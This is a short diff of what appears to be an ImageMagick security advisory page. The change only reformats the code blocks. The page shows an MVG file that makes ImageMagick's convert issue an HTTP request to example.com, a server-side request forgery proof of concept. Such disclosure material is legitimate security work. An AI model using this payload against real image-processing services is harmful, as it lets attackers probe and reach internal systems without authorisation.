@@ -144,12 +144,10 @@ drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..
   <p>It is possible to make HTTP GET or FTP request:</p>
 
   <b>ssrf.mvg</b>
-<pre><code>
-push graphic-context
+<pre><code>push graphic-context
 viewbox 0 0 640 480
 fill 'url(http://example.com/)'
-pop graphic-context
-</code></pre>
+pop graphic-context</code></pre>
 
   <b>the following then makes an http request to example.com</b>
   <pre><code>$ convert ssrf.mvg out.png</code></pre>
